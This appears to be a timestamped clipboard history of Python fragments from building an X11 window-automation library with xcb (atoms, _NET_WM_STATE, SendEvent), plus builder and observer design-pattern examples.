https://github.com/milkypostman/caw/blob/master/caw/caw.py#LC277
* Tue 11 Feb 2014 01:39:41 AM JST
print
* Tue 11 Feb 2014 02:02:49 AM JST
r.value.buf()[0:4]
* Tue 11 Feb 2014 02:03:55 AM JST
r.value.buf()[5:9]
* Tue 11 Feb 2014 02:21:32 AM JST
def
* Tue 11 Feb 2014 02:26:07 AM JST
['.', '\x01', '\x00', '\x00', '-', '\x01', '\x00', '\x00']
* Tue 11 Feb 2014 02:26:31 AM JST
elm
* Tue 11 Feb 2014 02:26:59 AM JST
tes = ['.', '\x01', '\x00', '\x00', '-', '\x01', '\x00', '\x00']
* Tue 11 Feb 2014 02:29:20 AM JST
start
* Tue 11 Feb 2014 02:49:32 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 11 Feb 2014 02:52:49 AM JST
_NET_WM_STATE_MAXIMIZED_VERT
* Tue 11 Feb 2014 03:36:22 AM JST
connection, window_id, property_, type_,
                 offset=0, length=10
* Tue 11 Feb 2014 03:37:59 AM JST
PropertyHandler
* Tue 11 Feb 2014 03:38:50 AM JST
def
* Tue 11 Feb 2014 03:43:51 AM JST
'_NET_WM_STATE'
* Tue 11 Feb 2014 03:48:00 AM JST
Resource
* Tue 11 Feb 2014 03:48:10 AM JST
class StateHandler(Resource):
    r"""
    """
    MODE_UNSET  = 0
    MODE_SET    = 1
    MODE_TOGGLE = 2

    def __init__(self, connection, window_id, property_):
        r"""SUMMARY

        __init__(connection, window_id, property_)

        @Arguments:
        - `connection`:
        - `window_id`:
        - `property_`:

        @Return:
        """
        PropertyHandler.__init__(self, connection, window_id,
                                 connection.core.InternAtom(
                                     True, len('_NET_WM_STATE'),
                                     '_NET_WM_STATE'), 0, 0, 65535)
        self.property = property_


* Tue 11 Feb 2014 03:51:13 AM JST
        PropertyHandler.__init__(self, connection, window_id,
                                 connection.core.InternAtom(
                                     True, len('_NET_WM_STATE'),
                                     '_NET_WM_STATE'), 0, 0, 65535)

* Tue 11 Feb 2014 03:51:41 AM JST
'_NET_WM_STATE'
* Tue 11 Feb 2014 03:52:00 AM JST
NET_WM_STATE
* Tue 11 Feb 2014 03:52:50 AM JST
_window_
* Tue 11 Feb 2014 04:06:51 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 11 Feb 2014 04:06:54 AM JST
window.StateHandler(acwin.id,c,)
* Tue 11 Feb 2014 04:07:42 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 11 Feb 2014 04:07:52 AM JST
NET_WM_STATE_MAXIMIZED_VERT
* Tue 11 Feb 2014 04:08:10 AM JST
window.StateHandler(acwin.id,c,)
* Tue 11 Feb 2014 04:08:17 AM JST
NET_WM_STATE_MAXIMIZED_VERT
* Tue 11 Feb 2014 04:11:03 AM JST
property
* Tue 11 Feb 2014 04:12:36 AM JST
append
* Tue 11 Feb 2014 07:25:19 AM JST
_window_
* Tue 11 Feb 2014 07:25:28 AM JST
STATE_MAXIMIZED_VERT
* Tue 11 Feb 2014 07:25:34 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 11 Feb 2014 07:25:40 AM JST
'_NET_WM_STATE_MAXIMIZED_HORZ'
* Tue 11 Feb 2014 07:25:49 AM JST
'_NET_
* Tue 11 Feb 2014 07:25:56 AM JST
'_NET_WM_STATE_MAXIMIZED_HORZ'
* Tue 11 Feb 2014 07:26:03 AM JST
WM_
* Tue 11 Feb 2014 07:27:04 AM JST
StateHandler
* Tue 11 Feb 2014 07:28:50 AM JST
get_wm_
* Tue 11 Feb 2014 07:29:31 AM JST
self._connection.core.InternAtom(
                                          True, len(self.NET_WM_STATE),
                                          self.NET_WM_STATE).reply().atom
* Tue 11 Feb 2014 07:29:58 AM JST
self.STATE_MAXIMIZED_VERT
* Tue 11 Feb 2014 07:30:27 AM JST
self._connection.core.InternAtom(
            True, len(self.STATE_MAXIMIZED_VERT),
            self.STATE_MAXIMIZED_VERT).reply().atom
* Tue 11 Feb 2014 07:42:38 AM JST
import 
* Tue 11 Feb 2014 07:43:18 AM JST
from xautohotkey import window

In [4]: import wm

In [5]: acwin=wm.active.get()

In [6]: import xcb

In [7]: import xcb.xproto

In [8]: 
* Tue 11 Feb 2014 07:43:35 AM JST
c=xcb.connect()
* Tue 11 Feb 2014 07:49:05 AM JST
rid, 
* Tue 11 Feb 2014 07:58:37 AM JST
not 
* Tue 11 Feb 2014 07:58:56 AM JST
PropertyHandler(self._connection, self.id,
                                      self._connection.core.InternAtom(
                                          True, len(self.NET_WM_STATE),
                                          self.NET_WM_STATE).reply().atom,
                                      0, 0, 65535)
* Tue 11 Feb 2014 07:59:02 AM JST
    
* Tue 11 Feb 2014 08:06:10 AM JST
https://github.com/milkypostman/caw/blob/master/caw/caw.py#LC277
* Tue 11 Feb 2014 08:06:58 AM JST
Replace
* Tue 11 Feb 2014 08:07:06 AM JST
Prepend
* Tue 11 Feb 2014 08:07:57 AM JST
c.core.ChangeProperty(xpro)
* Tue 11 Feb 2014 08:08:14 AM JST
'_NET_WM_STATE_SHADED'
* Tue 11 Feb 2014 08:09:10 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 11 Feb 2014 08:09:36 AM JST
_NET_WM_STATE_SHADED
* Tue 11 Feb 2014 08:09:59 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 11 Feb 2014 08:10:09 AM JST
_NET_WM_STATE_MAXIMIZED_VERT
* Tue 11 Feb 2014 08:10:17 AM JST
_NET_WM_STATE_MAXIMIZED_HORZ
* Tue 11 Feb 2014 08:10:30 AM JST
_NET_WM_STATE_MAXIMIZED_HORZ
* Tue 11 Feb 2014 08:11:29 AM JST
'_NET_WM_STATE'
* Tue 11 Feb 2014 08:11:47 AM JST
_NET_WM_STATE
* Tue 11 Feb 2014 08:13:51 AM JST
_NET_WM_STATE_MAXIMIZED_HORZ
* Tue 11 Feb 2014 08:14:28 AM JST
_NET_WM_STATE_MAXIMIZED_VERT
* Tue 11 Feb 2014 08:15:17 AM JST
struct.pack('II', _NET_WM_STATE_MAXIMIZED_HORZ, _NET_WM_STATE_MAXIMIZED_VERT)
* Tue 11 Feb 2014 08:20:51 AM JST
struct.pack("I",1)
* Tue 11 Feb 2014 08:22:27 AM JST
st=struct.pack('II', _NET_WM_STATE_MAXIMIZED_HORZ, _NET_WM_STATE_MAXIMIZED_VERT)
* Tue 11 Feb 2014 08:25:05 AM JST
ChangeProperty
* Tue 11 Feb 2014 08:31:39 AM JST
'_NET_WM_STATE_ABOVE'
* Tue 11 Feb 2014 08:33:22 AM JST
struct.pack('I', _NET_WM_STATE_ABOVE)
* Tue 11 Feb 2014 08:35:27 AM JST
xcb.xproto.ConfigWindow.Y
* Tue 11 Feb 2014 08:37:39 AM JST
conn.core.ChangeProperty(xproto.PropMode.Replace, win, xcb.XA_WM_NAME, xcb.XA_STRING, 8, len("CAW!"), "CAW!")
* Tue 11 Feb 2014 08:43:54 AM JST
conn.core.MapWindow(window)
* Tue 11 Feb 2014 08:49:23 AM JST
Configure
* Tue 11 Feb 2014 08:49:41 AM JST
ConfigureWindow
* Tue 11 Feb 2014 08:50:20 AM JST
ChangeProperty
* Tue 11 Feb 2014 08:55:14 AM JST
core
* Tue 11 Feb 2014 09:36:43 AM JST
EventMask
* Tue 11 Feb 2014 09:37:10 AM JST
EventMask
* Tue 11 Feb 2014 09:37:38 AM JST
SubstructureRedirectMask
* Tue 11 Feb 2014 09:37:56 AM JST
SubstructureRedirect
* Tue 11 Feb 2014 09:39:47 AM JST
ClientMessageData
* Tue 11 Feb 2014 09:46:48 AM JST
sendevent
* Tue 11 Feb 2014 09:51:36 AM JST
X.SubstructureRedirectMask
* Tue 11 Feb 2014 09:51:50 AM JST
SubstructureRedirect
* Tue 11 Feb 2014 09:53:32 AM JST
struct
* Tue 11 Feb 2014 09:56:20 AM JST
ConfigureWindow?
* Tue 11 Feb 2014 10:03:59 AM JST
event=struct.pack('BBHII5I', 33, 32, 0, acwin.id, )
* Tue 11 Feb 2014 10:04:47 AM JST
event=struct.pack('BBHII5I', 33, 32, 0, acwin.id, _NET_WM_STATE, _STATE_ABOVE)
* Tue 11 Feb 2014 10:07:35 AM JST
c.core.SendEvent(0, acwin.id, )
* Tue 11 Feb 2014 10:07:45 AM JST
SubstructureRedirect
* Tue 11 Feb 2014 10:07:52 AM JST
c.core.SendEvent(0, acwin.id, )
* Tue 11 Feb 2014 10:07:56 AM JST
SubstructureRedirect
* Tue 11 Feb 2014 10:26:39 AM JST
MODE_SET
* Tue 11 Feb 2014 10:27:22 AM JST
self.send_event(self.MODE_SET)
* Tue 11 Feb 2014 10:27:26 AM JST
MODE_SET
* Tue 11 Feb 2014 10:27:33 AM JST
pass
* Tue 11 Feb 2014 10:33:52 AM JST
print
* Tue 11 Feb 2014 10:34:00 AM JST
print()
* Tue 11 Feb 2014 10:34:14 AM JST
'! \x00\x00\x16\x00`\x03(\x01\x00\x00\x01\x00\x00\x00)\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
* Tue 11 Feb 2014 10:34:19 AM JST
'! \x00\x00\x16\x00`\x03\x00\x00\x00\x00\x01\x00\x00\x00)\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
* Tue 11 Feb 2014 10:34:37 AM JST
'! \x00\x00\x16\x00`\x03(\x01\x00\x00\x01\x00\x00\x00)\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
* Tue 11 Feb 2014 10:37:39 AM JST
_NET_WM_STATE
* Tue 11 Feb 2014 10:38:25 AM JST
handler._type
* Tue 11 Feb 2014 10:40:07 AM JST
_type
* Tue 11 Feb 2014 10:40:13 AM JST

* Tue 11 Feb 2014 10:40:13 AM JST

* Tue 11 Feb 2014 10:40:13 AM JST
        print(handler._type)

* Tue 11 Feb 2014 10:40:14 AM JST

* Tue 11 Feb 2014 10:40:14 AM JST

* Tue 11 Feb 2014 10:40:14 AM JST
        print(repr(event))

* Tue 11 Feb 2014 10:41:37 AM JST
print(values)
* Tue 11 Feb 2014 10:44:25 AM JST
_get_handler()
* Tue 11 Feb 2014 10:47:55 AM JST

* Tue 11 Feb 2014 10:47:56 AM JST

* Tue 11 Feb 2014 10:47:56 AM JST
        print(len(values))

* Tue 11 Feb 2014 10:47:58 AM JST

* Tue 11 Feb 2014 10:47:58 AM JST

* Tue 11 Feb 2014 10:47:58 AM JST
            print('hello')

* Tue 11 Feb 2014 10:47:59 AM JST

* Tue 11 Feb 2014 10:47:59 AM JST

* Tue 11 Feb 2014 10:47:59 AM JST
            print(start)

* Tue 11 Feb 2014 10:47:59 AM JST
            print(start)

* Tue 11 Feb 2014 10:47:59 AM JST
            print(start)
            print(end)

* Tue 11 Feb 2014 10:48:27 AM JST
connection
* Tue 11 Feb 2014 10:48:30 AM JST
core.
* Tue 11 Feb 2014 11:12:22 AM JST
StateHandler
* Tue 11 Feb 2014 11:34:10 AM JST
0
* Tue 11 Feb 2014 11:34:10 AM JST
d3=0
* Tue 11 Feb 2014 11:34:49 AM JST
        
* Tue 11 Feb 2014 12:07:50 PM JST
Resource
* Wed 12 Feb 2014 03:17:21 AM JST
/data/archive/ref/book/Programming/Design_Pattern
* Wed 12 Feb 2014 03:17:49 AM JST
Object_Design_Roles_Responsibilities_and_Collaborations
* Wed 12 Feb 2014 04:20:45 AM JST
/usr/lib/python2.7/dist-packages/xcb/xproto.py
* Wed 12 Feb 2014 04:22:13 AM JST
/usr/lib/python2.7/dist-packages/xcb/xproto.py
* Wed 12 Feb 2014 04:25:04 AM JST
for
* Wed 12 Feb 2014 04:29:14 AM JST
name
* Wed 12 Feb 2014 04:30:20 AM JST
InternAtomUnchecked
* Wed 12 Feb 2014 04:31:55 AM JST
check()
* Wed 12 Feb 2014 04:36:32 AM JST
coo=
* Wed 12 Feb 2014 04:39:28 AM JST
.reply()
* Wed 12 Feb 2014 04:39:30 AM JST
atom
* Wed 12 Feb 2014 04:40:59 AM JST
self.
* Wed 12 Feb 2014 04:42:04 AM JST

* Wed 12 Feb 2014 04:42:04 AM JST

* Wed 12 Feb 2014 04:42:04 AM JST
        tmp = self.copy()

* Wed 12 Feb 2014 04:45:36 AM JST
False
* Wed 12 Feb 2014 04:45:36 AM JST
clear=False
* Wed 12 Feb 2014 04:46:15 AM JST
import 
* Wed 12 Feb 2014 04:51:28 AM JST
usecache=True
* Wed 12 Feb 2014 05:08:01 AM JST

* Wed 12 Feb 2014 05:08:02 AM JST

* Wed 12 Feb 2014 05:08:02 AM JST
        self._num = num

* Wed 12 Feb 2014 05:11:56 AM JST
        self._name = str(self._connection.core.GetAtomName(self).reply().name.buf())
* Wed 12 Feb 2014 05:12:01 AM JST
        self._name = str(self._connection.core.GetAtomName(self).reply().name.buf())
* Wed 12 Feb 2014 05:14:39 AM JST
int() can't convert non-string with explicit base
* Wed 12 Feb 2014 05:14:52 AM JST
Search
* Wed 12 Feb 2014 05:15:48 AM JST
                          def __new__(cls, *args, **kwargs):                   
                              return  super(TestClass, cls).__new__(cls, 5)    

* Wed 12 Feb 2014 05:16:09 AM JST
*args, **kwargs
* Wed 12 Feb 2014 05:16:27 AM JST
TestClass
* Wed 12 Feb 2014 05:20:36 AM JST

* Wed 12 Feb 2014 05:20:36 AM JST

* Wed 12 Feb 2014 05:20:36 AM JST
        print(kwargs)

* Wed 12 Feb 2014 05:20:54 AM JST
kwargs
* Wed 12 Feb 2014 05:21:32 AM JST

* Wed 12 Feb 2014 05:21:32 AM JST

* Wed 12 Feb 2014 05:21:32 AM JST
        print(args[1])

* Wed 12 Feb 2014 05:30:03 AM JST
self[name]
* Wed 12 Feb 2014 05:30:27 AM JST
cookie.reply().atom
* Wed 12 Feb 2014 05:30:41 AM JST
Atom(self._connection, cookie.reply().atom, name)
* Wed 12 Feb 2014 08:54:16 AM JST
pip search pynotify
* Wed 12 Feb 2014 09:51:13 AM JST

* Wed 12 Feb 2014 09:51:13 AM JST

* Wed 12 Feb 2014 09:51:13 AM JST
import _pynotify

* Wed 12 Feb 2014 09:54:19 AM JST
dict
* Wed 12 Feb 2014 09:54:46 AM JST

* Wed 12 Feb 2014 09:54:46 AM JST

* Wed 12 Feb 2014 09:54:46 AM JST
        dict.__init__(self)

* Wed 12 Feb 2014 10:46:41 AM JST
isabs()
* Wed 12 Feb 2014 11:19:12 AM JST
self._connection.core.GetAtomName(self)
* Wed 12 Feb 2014 11:22:14 AM JST
_get_name_buffer
* Wed 12 Feb 2014 11:22:21 AM JST
buf()
* Wed 12 Feb 2014 11:22:55 AM JST

* Wed 12 Feb 2014 11:22:55 AM JST

* Wed 12 Feb 2014 11:22:55 AM JST
        buf = self._get_reply().name.buf()

* Wed 12 Feb 2014 11:22:56 AM JST
buf
* Wed 12 Feb 2014 11:24:43 AM JST
self._core_get_atom_name
* Thu 13 Feb 2014 02:14:15 AM JST
#==============================================================================
class Vehicle(object):
 
    def __init__(self, type_name):
        self.type = type_name
        self.wheels = None
        self.doors = None
        self.seats = None
 
    def view(self):
        print(
            "This vehicle is a " +
            self.type +
            " with; " +
            str(self.wheels) +
            " wheels, " +
            str(self.doors) +
            " doors, and " +
            str(self.seats) +
            " seats."
            )
* Thu 13 Feb 2014 02:14:30 AM JST
#==============================================================================
class CarBuilder(VehicleBuilder):
 
    def __init__(self):
        self.vehicle = Vehicle("Car ")
 
    def make_wheels(self):
        self.vehicle.wheels = 4
 
    def make_doors(self):
        self.vehicle.doors = 3
 
    def make_seats(self):
        self.vehicle.seats = 5
 
#==============================================================================
class BikeBuilder(VehicleBuilder):
 
    def __init__(self):
        self.vehicle = Vehicle("Bike")
 
    def make_wheels(self):
        self.vehicle.wheels = 2
 
    def make_doors(self):
        self.vehicle.doors = 0
 
    def make_seats(self):
        self.vehicle.seats = 2
* Thu 13 Feb 2014 02:15:04 AM JST
#==============================================================================
class VehicleBuilder(object):
    """
    An abstract builder class, for concrete builders to be derived from.
    """
    __metadata__ = abc.ABCMeta
     
    @abc.abstractmethod
    def make_wheels(self):
        raise
 
    @abc.abstractmethod
    def make_doors(self):
        raise
 
    @abc.abstractmethod
    def make_seats(self):
        raise
* Thu 13 Feb 2014 02:15:15 AM JST

* Thu 13 Feb 2014 02:15:15 AM JST

* Thu 13 Feb 2014 02:15:15 AM JST
from ab import 

* Thu 13 Feb 2014 02:15:49 AM JST
#==============================================================================
class VehicleManufacturer(object):
    """
    The director class, this will keep a concrete builder.
    """
     
    def __init__(self):
        self.builder = None
 
    def create(self):
        """ 
        Creates and returns a Vehicle using self.builder
        Precondition: not self.builder is None
        """
        assert not self.builder is None, "No defined builder"
        self.builder.make_wheels()
        self.builder.make_doors()
        self.builder.make_seats()
        return self.builder.vehicle
* Thu 13 Feb 2014 02:16:01 AM JST
#==============================================================================
if (__name__ == "__main__"):
    manufacturer = VehicleManufacturer()
     
    manufacturer.builder = CarBuilder()
    car = manufacturer.create()
    car.view()
 
    manufacturer.builder = BikeBuilder()
    bike = manufacturer.create()
    bike.view()
* Thu 13 Feb 2014 02:16:50 AM JST
This vehicle is a Car  with; 4 wheels, 3 doors, and 5 seats.
This vehicle is a Bike with; 2 wheels, 0 doors, and 2 seats.
* Thu 13 Feb 2014 02:17:32 AM JST
 class Listener:
     def __init__(self, name, subject):
         self.name = name
         subject.register(self)
 
     def update(self, event):
         print self.name, "received event", event
 
 class Subject:
     def __init__(self):
         self.listeners = []
 
     def register(self, listener):
         self.listeners.append(listener)
 
     def unregister(self, listener):
         self.listeners.remove(listener)
 
     def notify_listeners(self, event):
         for listener in self.listeners:
             listener.update(event)
 
 subject = Subject()
 listenerA = Listener("<listener A>", subject)
 listenerB = Listener("<listener B>", subject)
 # subject には2つのリスナーが登録されている。
 subject.notify_listeners ("<event 1>")
 # 出力:
 #     <listener A> received event <event 1>
 #     <listener B> received event <event 1>
* Thu 13 Feb 2014 02:29:21 AM JST
https://github.com/faif/python-patterns.git
* Thu 13 Feb 2014 02:36:42 AM JST
ステレオタイプ
* Thu 13 Feb 2014 03:46:23 AM JST
ステレオタイプ
* Thu 13 Feb 2014 04:00:34 AM JST
inspect.
* Thu 13 Feb 2014 04:04:25 AM JST
        cookie = self._connection.core.InternAtom(False, len(name), name)
        atom_num = cookie.reply().atom

* Thu 13 Feb 2014 04:05:06 AM JST
self._connection.core.InternAtom
* Thu 13 Feb 2014 04:05:17 AM JST
core.
* Thu 13 Feb 2014 04:05:18 AM JST
_connection.core.
* Thu 13 Feb 2014 04:06:13 AM JST
Atom(self._connection, atom_num, name)
* Thu 13 Feb 2014 04:06:40 AM JST
class AtomName(object):
    r"""
    """

    def __init__(self, connection, name):
        r"""

        @Arguments:
        - `connection`:
        - `name`:
        """
        self._connection = connection
        self._InternAtom = self._connection.core.InternAtom
        if not predicate.isstring(name):
            # TODO: (Atami) [2014/02/13]
            raise ValueError()
        self._name = name

    def intern_atom(self, ):
        r"""SUMMARY

        intern_atom()

        @Return:
        """
        cookie = self._InternAtom(False, len(self._name), self._name)
        atom_num = cookie.reply().atom
        return Atom(self._connection, atom_num, name)

    def __str__(self, ):
        r"""SUMMARY

        __str__()

        @Return:
        """
        return self._name

    def __repr__(self, ):
        r"""SUMMARY

        __repr__()

        @Return:
        """
        return self._name



* Thu 13 Feb 2014 04:11:42 AM JST
InternAtom
* Thu 13 Feb 2014 04:21:29 AM JST

* Thu 13 Feb 2014 04:21:29 AM JST

* Thu 13 Feb 2014 04:21:29 AM JST
        self._name = name

* Thu 13 Feb 2014 04:21:57 AM JST
_name
* Thu 13 Feb 2014 04:21:57 AM JST
self._name
* Thu 13 Feb 2014 04:21:59 AM JST
_name = 
* Thu 13 Feb 2014 04:22:00 AM JST
self._name = 
* Thu 13 Feb 2014 04:22:01 AM JST
str(self._get_name_buffer())
* Thu 13 Feb 2014 04:22:48 AM JST
_InternAtom
* Thu 13 Feb 2014 04:23:00 AM JST
_core_intern_atom
* Thu 13 Feb 2014 04:27:58 AM JST
and 
* Thu 13 Feb 2014 04:27:58 AM JST
None and 
* Thu 13 Feb 2014 04:27:59 AM JST
is None and 
* Thu 13 Feb 2014 04:28:04 AM JST
num is None and 
* Thu 13 Feb 2014 04:28:29 AM JST
        if not (num or name):
            # TODO: (Atami) [2014/02/13]
            raise valueError()

* Thu 13 Feb 2014 04:31:52 AM JST
not 
* Thu 13 Feb 2014 04:33:27 AM JST
_num
* Thu 13 Feb 2014 04:38:00 AM JST
import 
* Thu 13 Feb 2014 04:40:21 AM JST

* Thu 13 Feb 2014 04:40:21 AM JST

* Thu 13 Feb 2014 04:40:21 AM JST
        self._num = num

* Thu 13 Feb 2014 04:41:08 AM JST

* Thu 13 Feb 2014 04:41:09 AM JST

* Thu 13 Feb 2014 04:41:09 AM JST
        self._num = AtomNumber(self._num)

* Thu 13 Feb 2014 04:42:00 AM JST

* Thu 13 Feb 2014 04:42:00 AM JST

* Thu 13 Feb 2014 04:42:00 AM JST
            self.

* Thu 13 Feb 2014 04:42:30 AM JST

* Thu 13 Feb 2014 04:42:30 AM JST

* Thu 13 Feb 2014 04:42:30 AM JST
        self._num = AtomNumber(self._num)

* Thu 13 Feb 2014 04:42:55 AM JST
self._num.get_atom_name()
* Thu 13 Feb 2014 04:43:39 AM JST
self._name.intern_atom()
* Thu 13 Feb 2014 04:43:44 AM JST

* Thu 13 Feb 2014 04:43:44 AM JST

* Thu 13 Feb 2014 04:43:44 AM JST
        self._name = AtomName(self._name)

* Thu 13 Feb 2014 04:47:13 AM JST
self._connection,
* Thu 13 Feb 2014 04:47:33 AM JST
_connetcion
* Thu 13 Feb 2014 04:50:15 AM JST
self._connection, 
* Thu 13 Feb 2014 05:04:04 AM JST
class AtomNumber(int):
    r"""
    """
    def __new__(cls, *args, **kwargs):
        if 'num' in kwargs:
            num = kwargs['num']
        elif 2 <= len(args):
            num = args[1]
        else:
            # TODO: (Atami) [2014/02/12]
            # define Error
            raise StandardError(str(args))
        return  super(AtomNumber, cls).__new__(cls, num)

    def __init__(self, connection, num):
        r"""

        @Arguments:
        - `num`:
        - `name`:
        """
        int.__init__(self, num)
        self._connection = connection
        self._core_get_atom_name = self._connection.core.GetAtomName

    def _make_cookie(self, ):
        r"""SUMMARY

        _make_cookie()

        @Return:
        """
        return self._core_get_atom_name(self)

    def _get_reply(self, ):
        r"""SUMMARY

        _get_reply()

        @Return:
        """
        return self._make_cookie().reply()

    def _get_name_list(self, ):
        r"""SUMMARY

        _get_name_buffer()

        @Return:
        """
        return self._get_reply().name

    def _get_name_buffer(self, ):
        r"""SUMMARY

        _get_name_buffer()

        @Return:
        """
        return self._get_name_list().buf()

    def get_atom_name(self, ):
        r"""SUMMARY

        get_atom_name()

        @Return:
        """
        return str(self._get_name_buffer())

    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        return struct.pack('I', self)

* Thu 13 Feb 2014 05:04:26 AM JST

* Thu 13 Feb 2014 05:04:26 AM JST

* Thu 13 Feb 2014 05:04:26 AM JST
    self._num

* Thu 13 Feb 2014 05:04:37 AM JST

* Thu 13 Feb 2014 05:04:37 AM JST

* Thu 13 Feb 2014 05:04:37 AM JST
        int.__init__(self, num)

* Thu 13 Feb 2014 05:12:25 AM JST
atom_num = 
* Thu 13 Feb 2014 05:12:27 AM JST

* Thu 13 Feb 2014 05:12:28 AM JST

* Thu 13 Feb 2014 05:12:28 AM JST
        return AtomNumber(self._connection, atom_num)

* Thu 13 Feb 2014 05:23:23 AM JST

* Thu 13 Feb 2014 05:23:23 AM JST

* Thu 13 Feb 2014 05:23:23 AM JST
            self._name = None

* Thu 13 Feb 2014 05:24:07 AM JST

* Thu 13 Feb 2014 05:24:07 AM JST

* Thu 13 Feb 2014 05:24:07 AM JST
            self._num = None

* Thu 13 Feb 2014 05:25:15 AM JST
StandardError
* Thu 13 Feb 2014 05:26:21 AM JST

* Thu 13 Feb 2014 05:26:21 AM JST

* Thu 13 Feb 2014 05:26:21 AM JST
            self._num = None

* Thu 13 Feb 2014 05:26:27 AM JST

* Thu 13 Feb 2014 05:26:27 AM JST

* Thu 13 Feb 2014 05:26:27 AM JST
        else:

* Thu 13 Feb 2014 05:26:30 AM JST

* Thu 13 Feb 2014 05:26:30 AM JST

* Thu 13 Feb 2014 05:26:30 AM JST
            self._name = None

* Thu 13 Feb 2014 05:26:36 AM JST

* Thu 13 Feb 2014 05:26:36 AM JST

* Thu 13 Feb 2014 05:26:37 AM JST
        else:

* Thu 13 Feb 2014 05:29:19 AM JST
self._num = AtomNumber(self._connection, num)
* Thu 13 Feb 2014 05:29:30 AM JST
self._name = AtomName(self._connection, name)
* Thu 13 Feb 2014 05:29:56 AM JST
num
* Thu 13 Feb 2014 05:30:01 AM JST
name
* Thu 13 Feb 2014 05:31:18 AM JST
Standard
* Thu 13 Feb 2014 05:31:41 AM JST
    # TODO: (Atami) [2014/02/13]
                        # DuplicateError
                        raise ValueError()
* Thu 13 Feb 2014 05:32:01 AM JST
self._num = AtomNumber(self._connection, arg)
* Thu 13 Feb 2014 05:32:08 AM JST
kwargs['name']
* Thu 13 Feb 2014 05:32:10 AM JST

* Thu 13 Feb 2014 05:32:10 AM JST

* Thu 13 Feb 2014 05:32:10 AM JST
                name = kwargs['name']

* Thu 13 Feb 2014 05:32:39 AM JST
                    # TODO: (Atami) [2014/02/13]
                    # DuplicateError
                    raise ValueError()
                self._num = AtomNumber(self._connection, kwargs['name'])

* Thu 13 Feb 2014 05:32:44 AM JST
name
* Thu 13 Feb 2014 05:32:47 AM JST

* Thu 13 Feb 2014 05:32:47 AM JST

* Thu 13 Feb 2014 05:32:47 AM JST
                name = kwargs['num']

* Thu 13 Feb 2014 05:33:02 AM JST
                    if self._name:
                        # TODO: (Atami) [2014/02/13]
                        # DuplicateError
                        raise ValueError()
                    self._name = AtomName(self._connection, arg)

* Thu 13 Feb 2014 05:33:07 AM JST

* Thu 13 Feb 2014 05:33:08 AM JST

* Thu 13 Feb 2014 05:33:08 AM JST
                if self._name:

* Thu 13 Feb 2014 05:33:43 AM JST
kwargs
* Thu 13 Feb 2014 05:33:53 AM JST
            if 'name' in kwargs:
                if self._name:
                    # TODO: (Atami) [2014/02/13]
                    # DuplicateError
                    raise ValueError()
                self._name = AtomName(self._connection, kwargs['name'])

* Thu 13 Feb 2014 05:37:56 AM JST
5, 
* Thu 13 Feb 2014 05:37:57 AM JST
num=5, 
* Thu 13 Feb 2014 05:39:40 AM JST
Atom(c, name='BITMAP')
* Thu 13 Feb 2014 05:39:49 AM JST
window.Atom(c, 'BITMAP')
* Thu 13 Feb 2014 05:39:52 AM JST
window.
* Thu 13 Feb 2014 05:39:56 AM JST
Atom(c, 5)
* Thu 13 Feb 2014 05:40:03 AM JST
Atom(c, num=5, name='BITMAP')
* Thu 13 Feb 2014 05:40:12 AM JST
Atom(c, num=5)
* Thu 13 Feb 2014 05:40:48 AM JST
Atom(c, 5, 'BITMAP')
* Thu 13 Feb 2014 05:41:02 AM JST
Atom(c, num=5, name='BITMAP')
Atom(c, num=5)
Atom(c, name='BITMAP')
Atom(c, 5)    
Atom(c, 'BITMAP')
Atom(c, 5, 'BITMAP')

* Thu 13 Feb 2014 06:29:10 AM JST
BITMAP
* Thu 13 Feb 2014 07:13:49 AM JST
__class__()
* Thu 13 Feb 2014 07:18:23 AM JST
window
* Thu 13 Feb 2014 07:18:23 AM JST
xautohotkey.window
* Thu 13 Feb 2014 02:04:15 PM JST
.__nonzero__
* Thu 13 Feb 2014 02:06:06 PM JST
return long(
* Thu 13 Feb 2014 02:06:07 PM JST
long(
* Thu 13 Feb 2014 02:07:20 PM JST
__coerce__
* Thu 13 Feb 2014 02:07:54 PM JST
__coerce__
* Thu 13 Feb 2014 02:16:20 PM JST
numerator
* Thu 13 Feb 2014 02:19:10 PM JST
__add__           __mod__                      decode      partition 
__class__         __mul__                      encode      replace   
__contains__      __ne__                       endswith    rfind     
__delattr__       __new__                      expandtabs  rindex    
__doc__           __reduce__                   find        rjust     
__eq__            __reduce_ex__                format      rpartition
__format__        __repr__                     index       rsplit    
__ge__            __rmod__                     isalnum     rstrip    
__getattribute__  __rmul__                     isalpha     split     
__getitem__       __setattr__                  isdigit     splitlines
__getnewargs__    __sizeof__                   islower     startswith
__getslice__      __str__                      isspace     strip     
__gt__            __subclasshook__             istitle     swapcase  
__hash__          _formatter_field_name_split  isupper     title     
__init__          _formatter_parser            join        translate 
__le__            capitalize                   ljust       upper     
__len__           center                       lower       zfill     
__lt__            count                        lstrip   

* Thu 13 Feb 2014 02:19:20 PM JST
__abs__           __hex__      __radd__       __rtruediv__    
__add__           __index__    __rand__       __rxor__        
__and__           __init__     __rdiv__       __setattr__     
__class__         __int__      __rdivmod__    __sizeof__      
__cmp__           __invert__   __reduce__     __str__         
__coerce__        __long__     __reduce_ex__  __sub__         
__delattr__       __lshift__   __repr__       __subclasshook__
__div__           __mod__      __rfloordiv__  __truediv__     
__divmod__        __mul__      __rlshift__    __trunc__       
__doc__           __neg__      __rmod__       __xor__         
__float__         __new__      __rmul__       bit_length      
__floordiv__      __nonzero__  __ror__        conjugate       
__format__        __oct__      __rpow__       denominator     
__getattribute__  __or__       __rrshift__    imag            
__getnewargs__    __pos__      __rshift__     numerator       
__hash__          __pow__      __rsub__       real           

* Thu 13 Feb 2014 02:27:59 PM JST
new
* Thu 13 Feb 2014 02:28:03 PM JST
return 
* Thu 13 Feb 2014 02:30:22 PM JST
Some
* Thu 13 Feb 2014 02:43:18 PM JST
__subclasshook__
* Thu 13 Feb 2014 02:50:49 PM JST
Take
* Thu 13 Feb 2014 02:51:25 PM JST
variable
* Thu 13 Feb 2014 02:54:33 PM JST
